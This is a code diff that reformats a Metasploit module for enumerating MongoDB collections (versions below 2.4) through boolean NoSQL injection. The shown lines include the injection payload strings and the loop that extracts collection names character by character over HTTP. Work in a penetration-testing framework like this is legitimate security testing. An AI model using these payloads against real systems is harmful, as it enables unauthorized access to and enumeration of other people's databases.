@@ -7,36 +7,46 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "MongoDB NoSQL Collection Enumeration Via Injection",
-      'Description'    => %q{
-      This module can exploit NoSQL injections on MongoDB versions less than 2.4
-      and enumerate the collections available in the data via boolean injections.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        ['Brandon Perry <bperry.volatile[at]gmail.com>'],
-      'References'     =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "MongoDB NoSQL Collection Enumeration Via Injection",
+        'Description' => %q{
+          This module can exploit NoSQL injections on MongoDB versions less than 2.4
+          and enumerate the collections available in the data via boolean injections.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Brandon Perry <bperry.volatile[at]gmail.com>'],
+        'References' => [
           ['URL', 'https://nosql.mypopescu.com/post/14453905385/attacking-nosql-and-nodejs-server-side#_=_']
         ],
-      'Platform'       => ['linux', 'win'],
-      'Privileged'     => false,
-      'DisclosureDate' => '2014-06-07'))
+        'Platform' => ['linux', 'win'],
+        'Privileged' => false,
+        'DisclosureDate' => '2014-06-07',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
-      register_options(
+    register_options(
       [
         OptString.new('TARGETURI', [ true, 'Full vulnerable URI with [NoSQLi] where the injection point is', '/index.php?age=50[NoSQLi]'])
-      ])
+      ]
+    )
   end
 
   def syntaxes
-    [["\"'||this||'", "'||[inject]||'"],
-     ["\"';return+true;var+foo='", "';return+[inject];var+foo='"],
-     ['\'"||this||"','"||[inject]||"'],
-     ['\'";return+true;var+foo="', '";return+[inject];var+foo="'],
-     ["||this","||[inject]"]]
+    [
+      ["\"'||this||'", "'||[inject]||'"],
+      ["\"';return+true;var+foo='", "';return+[inject];var+foo='"],
+      ['\'"||this||"', '"||[inject]||"'],
+      ['\'";return+true;var+foo="', '";return+[inject];var+foo="'],
+      ["||this", "||[inject]"]
+    ]
   end
 
   def run
@@ -120,7 +130,7 @@ class MetasploitModule < Msf::Auxiliary
 
       name = ''
       (0...name_len).each do |k|
-        [*('a'..'z'),*('0'..'9'),*('A'..'Z'),'.'].each do |c|
+        [*('a'..'z'), *('0'..'9'), *('A'..'Z'), '.'].each do |c|
           str = "db.getCollectionNames()[#{i}][#{k}]=='#{c}'"
           res = send_request_cgi({
             'uri' => uri.sub('[NoSQLi]', pay.sub('[inject]', str))
